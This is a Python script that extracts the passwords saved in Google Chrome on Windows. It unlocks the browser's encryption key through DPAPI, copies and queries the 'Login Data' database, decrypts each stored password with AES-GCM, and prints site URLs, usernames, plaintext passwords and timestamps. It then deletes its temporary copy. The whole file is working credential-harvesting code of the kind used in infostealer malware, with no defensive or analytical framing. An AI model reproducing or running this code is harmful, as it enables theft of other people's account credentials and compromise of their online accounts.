import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

def get_chrome_datetime(chromedate):
    """Convert Chrome format timestamp to Python datetime."""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # remove DPAPI prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        encrypted_password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(encrypted_password)[:-16].decode()  # strip tag
        return decrypted_pass
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
        except Exception:
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")
    for row in cursor.fetchall():
        origin_url, action_url, username, password, date_created, date_last_used = row
        decrypted_password = decrypt_password(password, key)
        if username or decrypted_password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {decrypted_password}")
            if date_created and date_created != 86400000000:
                print(f"Creation date: {get_chrome_datetime(date_created)}")
            if date_last_used and date_last_used != 86400000000:
                print(f"Last used: {get_chrome_datetime(date_last_used)}")
            print("="*50)
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except Exception:
        pass

if __name__ == "__main__":
    main()
